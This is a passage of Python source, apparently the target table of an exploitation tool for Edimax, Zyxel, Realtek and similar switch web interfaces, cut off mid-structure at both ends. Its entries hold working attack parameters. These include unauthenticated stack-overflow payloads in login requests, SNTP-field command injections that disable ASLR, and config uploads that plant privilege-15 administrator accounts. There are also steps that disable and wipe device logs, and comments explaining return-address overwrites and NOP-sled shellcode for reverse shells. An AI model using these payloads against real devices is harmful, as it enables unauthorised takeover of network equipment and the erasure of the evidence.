						'clean_logmem_uri':'/cgi/set.cgi?cmd=log_ramClear',
						'clean_logmem_query':'{"":{}}',
						'vulnerable': False,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'set.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': True # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'md5',
						'content':'Content-Type\n\nconfig-file-header\nusername "USERNAME" secret encrypted PASSWORD\n\n------',
						'add_uri':'/cgi/httpuploadruncfg.cgi',
						'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
						'del_uri':'/cgi/set.cgi?cmd=aaa_userDel',
						'vulnerable': False,
						'safe': True
					}, 
					'sntp': {
						#
						# Most probably it is vulnerable
						#
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,
						'enable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'enable_query':'{"_ds=1&sntpStatus=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
						'inject_uri':'/cgi/set.cgi?cmd=sys_timeSntp',
						'inject_query':'{"_ds=1&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123&_de=1":{}}',
						'check_query':'{"_ds=1&srvDef=byIp&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123&_de=1":{}}',
						'delete_uri':'/cgi/set.cgi?cmd=sys_timeSntpDel',
						'delete_query':'{"":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'disable_query':'{"_ds=1&sntpStatus=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': False,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {	# Not vulnerable 
						'vulnerable': False,
					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',

						'log_settings_set_cmd':'',					# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'',						# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

						'log_fileClear_cmd':'',						# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?
														# /sqfs/home/web/cgi/set.cgi; cgi_log_settings_set()
						'log_settings_set':0x00,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_ramClear_set()
						'log_ramClear':0x00,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_fileClear_set()
						'log_fileClear':0x00,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': False,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
						'sys_timeSntp_set_cmd':'&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123',
						'sys_timeSntp_set_check':'&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123',

						'sys_timeSntpDel_set_cmd':'&sntpServer=+&cursntpPort=139',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sntpStatus=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sntpStatus=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntp_set()
						'sys_timeSntp_set':0x00,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
						'sys_timeSntpDel_set':0x00,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
						'sys_timeSettings_set':0x00,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': False,
						'safe': True
					}, 
					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'logout_uri':'/cgi/set.cgi?cmd=home_logout',
						'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
						'stack':True, # False = use Heap, and there are no ASLR

						'cgi':'set.cgi',				# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
						'START':0x00,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x00,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 77,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap

						'workaround':False,	# My LAB workaround
						'vulnerable': False,
						'safe': True
					},

				},
			},

			'Edimax': { 
				'vendor': 'EDIMAX Technology Co., Ltd.',
				'modulus_uri':'/cgi/get.cgi?cmd=home_login',
				'info_leak':False,
				'info_leak_JSON':True,
				'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
				'xsid':False,
				'xsid_uri':'/cgi/get.cgi?cmd=home_main',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'rsa',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
					'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
					'logout_uri':'/cgi/set.cgi?cmd=home_logout',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'/cgi/set.cgi?cmd=log_global',
						'disable_query':'{"_ds=1&empty=1&_de=1":{}}',
						'status':'/cgi/get.cgi?cmd=log_global',
						'clean_logfile_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logfile_query':'{"_ds=1&target=1&_de=1":{}}',
						'clean_logmem_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logmem_query':'{"_ds=1&target=0&_de=1":{}}',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httpuploadruncfg.cgi',
							'check_uri':'/tmp/http_saverun_cfg',
							'content':'/var/config/running-config',
							'content_check':'/var/config/running-config',
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httprestorecfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/mnt/startup-config',
							'content_check':'/mnt/startup-config',
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'/tmp/http_uploadfail',
							'content':'Copy: Illegal software format', # Not the real content, its the result of invalid firmware (workaround)
							'content_check':'Copy: Illegal software format',
							'vulnerable': True,
							'safe': True
						},
						'login.cgi': {
							'description':'Stack overflow in login.cgi (PoC: create file /tmp/VUL.TXT)',
							'authenticated': False,
							'response':'file',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'check_uri':'/tmp/VUL.TXT', # We cannot control the content...
							'content':'{"_ds=1&username='+ self.random_string(40) +'&password='+ '/' * 23 +'/tmp/VUL.TXT&_de=1":{}}',
							'content_check':'1',
							'vulnerable': True,
							'safe': True
						},
						'set.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'clear',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
						#'encryption':'nopassword',
						#'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" nopassword\n\n------', # Yep, working too
						'add_uri':'/cgi/httpuploadruncfg.cgi',
						'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
						'del_uri':'/cgi/set.cgi?cmd=sys_acctDel',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,
						'enable_uri':'/cgi/set.cgi?cmd=sys_time',
						'enable_query':'{"_ds=1&sntp=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_time',
						'inject_uri':'/cgi/set.cgi?cmd=sys_time',
						'inject_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&_de=1":{}}',
						'check_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&_de=1":{}}',
						'delete_uri':'/cgi/set.cgi?cmd=sys_time',
						'delete_query':'{"_ds=1&sntp=1&timezone=0&srvDef=ipv4&srvHost=+&port=139&dlsType=0&_de=1":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_time',
						'disable_query':'{"_ds=1&sntp=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
						'sys_ping_post_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',

						#'log_settings_set_cmd':'&logState=1&consoleState=1&ramState=1&fileState=1',	# Enable Logging CMD
						'log_settings_set_cmd':'&empty=1',			# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'&target=0',				# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

						'log_fileClear_cmd':'&target=1',			# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
						'sys_timeSntp_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&dlsType=0',
						'sys_timeSntp_set_check':'&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&dlsType=0',

						'sys_timeSntpDel_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=+&port=139&dlsType=0',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sntp=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sntp=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					}, 
					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'logout_uri':'/cgi/set.cgi?cmd=home_logout',
						'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
						'stack':True, # False = use Heap, and there are no ASLR
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'Zyxel': {
				'vendor': 'Zyxel Communications Corp.',
				'modulus_uri':'',
				'info_leak':False,
				'info_leak_JSON':False,
				'info_leak_uri':'',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':False,
					'encryption':'encode',
					'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
					'query':'username=USERNAME&password=PASSWORD&login=1',
					'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
					'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
					'vulnerable': False,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':False,
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'LOGGING_SERVICE=0&cmd=4353',
						'status':'/cgi-bin/dispatcher.cgi?cmd=4352',
						'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logfile_query':'cmd_4364=Clear+file+messages',
						'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logmem_query':'cmd_4364=Clear+buffered+messages',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': {
						'dispatcher.cgi': { # 'username' also suffer from heap overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'response':'502',
							'Content-Type':False,
							'authenticated': False,
							'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
							'content':'username='+ self.random_string(112) + '&password='+ self.random_string(60) + '&STARTUP_BACKUP=1',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'json':False,
						'authenticated': False,
						'encryption':'clear',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
						#'encryption':'nopassword',
						#'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" nopassword\n\n------', # Yep, working too
						'add_uri':'/cgi-bin/httpuploadruncfg.cgi',
						'del_query':'', 
						'del_uri':'/cgi-bin/dispatcher.cgi?cmd=524&usrName=USERNAME',
						'vulnerable': False,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':False,
						'authenticated': True,
						'enable_uri':'/cgi-bin/dispatcher.cgi',
						'enable_query':'sntp_enable=1&cmd=548',
						'status_uri':'',
						'inject_uri':'/cgi-bin/dispatcher.cgi',
						'inject_query':'sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123&cmd=550',
						'check_query':'sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123&cmd=550',
						'delete_uri':'/cgi-bin/dispatcher.cgi',
						'delete_query':'sntp_Server=+&sntp_Port=139&cmd=550',
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'sntp_enable=0&cmd=548',
						'verify_uri':'/tmp/check',
						'vulnerable': False,
						'safe': True
					},

					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {	# Not vulnerable 
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
						'description':'Stack overflow in "username/password" (PoC: add priv 15 credentials)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(100) +'_JUMP_&password='+ self.random_string(60) +'_CMD_&STARTUP_BACKUP=1',

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_del_account': {
						'description':'Stack overflow in "username/password" (PoC: del priv 15 credentials)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(100) +'_JUMP_&password='+ self.random_string(60) +'_CMD_&STARTUP_BACKUP=1',

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(100) +'_JUMP_&password='+ self.random_string(60) +'_CMD_&STARTUP_BACKUP=1',

						'log_settings_set_cmd':'&LOGGING_SERVICE=0',			# Disable Logging CMD
						'log_settings_set_SIGSEGV':False,						# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'&_del=0',	# Clean RAM log CMD
						'log_ramClear_SIGSEGV':False,							# Clean RAM log SIGSEGV ?

						'log_fileClear_cmd':'&_del=1',		# Clean FILE log CMD
						'log_fileClear_SIGSEGV':False,							# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(100) +'_JUMP_&password='+ self.random_string(60) +'_CMD_&STARTUP_BACKUP=1',

						'sys_timeSntp_set_cmd':'&sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123',
						'sys_timeSntp_set_check':'',

						'sys_timeSntpDel_set_cmd':'&sntp_Server=+&sntp_Port=139',

						'sys_timeSettings_set_cmd_enable':'&sntp_enable=1',
						'sys_timeSettings_set_cmd_disable':'&sntp_enable=0',
						'sys_timeSettings_set_SIGSEGV': False,		# SIGSEGV ?

						'workaround':True,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': False,
						'safe': True
					}, 

					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
						'query':'username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&STARTUP_BACKUP=1',
						'workaround':False,	# My LAB workaround
						'stack':True, # False = use Heap, and there are no ASLR
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'Realtek': {
				'vendor': 'Realtek',
				'modulus_uri':'',
				'info_leak':False,
				'info_leak_JSON':False,
				'info_leak_uri':'',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':False,
					'encryption':'clear',
					'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
					'query':'username=USERNAME&password=PASSWORD&login=1',
					'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
					'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':False,
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'LOGGING_SERVICE=0&cmd=5121',
						'status':'',
						'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logfile_query':'cmd_5132=Clear+file+messages',
						'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logmem_query':'cmd_5132=Clear+buffered+messages',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': {
						'httpuploadbakcfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadbakcfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadruncfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httprestorecfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'Image Signature Error',
							'vulnerable': True,
							'safe': True
						},
						'dispatcher.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'response':'502',
							'Content-Type':False,
							'authenticated': False,
							'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
							'content':'username=admin&password='+ self.random_string(184) + '&login=1',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'json':False,
						'authenticated': False,
						'encryption':'md5',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" secret encrypted PASSWORD\n\n------',
						'add_uri':'/cgi-bin/httpuploadruncfg.cgi',
						'del_query':'', 
						'del_uri':'/cgi-bin/dispatcher.cgi?cmd=524&usrName=USERNAME',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':False,
						'authenticated': True,
						'enable_uri':'/cgi-bin/dispatcher.cgi',
						'enable_query':'sntp_enable=1&cmd=548',
						'status_uri':'',
						'inject_uri':'/cgi-bin/dispatcher.cgi',
						'inject_query':'sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123&cmd=550',
						'check_query':'sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123&cmd=550',
						'delete_uri':'/cgi-bin/dispatcher.cgi',
						'delete_query':'sntp_Server=+&sntp_Port=139&cmd=550',
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'sntp_enable=0&cmd=548',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'&login=1&_CMD_',
						'sys_ping_post_check':'',
						'sys_ping_post_SIGSEGV': False,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround

						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',

						'log_settings_set_cmd':'&LOGGING_SERVICE=0',# Disable Logging CMD
						'log_settings_set_SIGSEGV':False,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'',						# Clean RAM log CMD
						'log_ramClear_SIGSEGV':False,				# Clean RAM log SIGSEGV ?

						'log_fileClear_cmd':'',						# Clean FILE log CMD
						'log_fileClear_SIGSEGV':False,				# Clean FILE log SIGSEGV ?

						'workaround':True,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',

						'sys_timeSntp_set_cmd':'&sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123',
						'sys_timeSntp_set_check':'&sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=139',

						'sys_timeSntpDel_set_cmd':'&sntp_Server=+&sntp_Port=139',

						'sys_timeSettings_set_cmd_enable':'&sntp_enable=1',
						'sys_timeSettings_set_cmd_disable':'&sntp_enable=0',
						'sys_timeSettings_set_SIGSEGV': False,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': False,
						'safe': True
					}, 

					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
